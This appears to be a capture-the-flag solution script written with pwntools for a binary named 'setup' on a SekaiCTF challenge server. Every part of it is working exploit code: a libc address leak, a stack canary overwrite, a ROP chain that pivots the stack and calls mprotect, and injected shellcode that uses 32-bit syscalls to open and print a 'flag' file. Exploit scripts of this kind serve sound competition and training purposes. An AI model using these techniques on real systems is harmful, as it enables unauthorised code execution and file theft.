from pwn import *

exe = context.binary = ELF('./setup', checksec=False)
#r = process('./setup')

r = remote('challs.ctf.sekai.team', 4002)


r.sendlineafter(b'> ', b'1')
# gdb.attach(r, api=True, gdbscript='''
#         #    b* install+628
#         #    b* install+703
#            b* install+833
#         #    c
#         #    c
#         #    c
#         #    c
#            c
#            c
#            ''')
context.log_level = 'debug'

pause_off = 0xed8c0 + 74
canary_off = - 0x2898
read_off = 0x117900
mapped_off = - 0x3000
mprotect_off = 0x121bb0
pop_rdi_off = 0x2e6c5
pop_rsi_off = 0x30081
pop_rdx_off = 0x120272
pop_rsp_off = 0x39762
fopen_off = 0x836c0

payload = b'a'*8
r.sendlineafter(b'to: ', payload)
r.sendlineafter(b'> ', b'1')
print(r.recvuntil(b'aaaaaaaa'))
out = r.recvuntil(b'\x7f')
pause_ = u64(out + b'\x00'*2)

libc_base = pause_ - pause_off
canary = libc_base + canary_off
read_ = libc_base + read_off
mapped = libc_base + mapped_off
mprotect = libc_base + mprotect_off
pop_rdi = libc_base + pop_rdi_off
pop_rsi = libc_base + pop_rsi_off
pop_rdx = libc_base + pop_rdx_off
pop_rsp = pop_rsp_off + libc_base
fopen = libc_base + fopen_off
print(hex(libc_base))
print(hex(canary))

payload = p64(canary) + b'a'*72 + p64(0) + p64(mapped + 0x58) + b'\x89\xaa'
r.sendafter(b'36m', payload)
r.sendafter(b'[0;36m', p64(0))

payload = flat(
    0,
    pop_rdi, 0,
    pop_rsi, mapped + 0x200,
    pop_rdx, 0x1000,
    read_,
    pop_rsp, mapped + 0x208,
    0, 0,
    pop_rsp, mapped + 8
)

print(r.recv())
r.sendafter(b'36m', payload)
print(r.recv())
r.sendafter(b'[0;36m', p64(0))


shell_code = flat(
    pop_rdi, mapped,
    pop_rsi, 0x1000,
    pop_rdx, 7,
    mprotect, mapped + 0x248
)

shell_code += asm('''
    mov rax, 0xc0
    mov rbx, 0x40400
    mov rcx, 0x1000
    mov rdx, 0x7
    mov rsi, 0x22
    xor rdi, rdi
    int 0x80
    mov rsp, 0x40400
    mov rax, 0x5
    push 0x0
    push 0x67616c66
    mov rbx, rsp
    xor rcx, rcx
    xor rdx, rdx 
    int 0x80
    mov rdi, rax
    xor rax, rax
    mov rsi, rsp
    mov rdx, 0x100
    syscall
    mov rax, 0x1
    mov rdi, 0x1
    syscall  
''')

r.send(shell_code)


r.interactive()
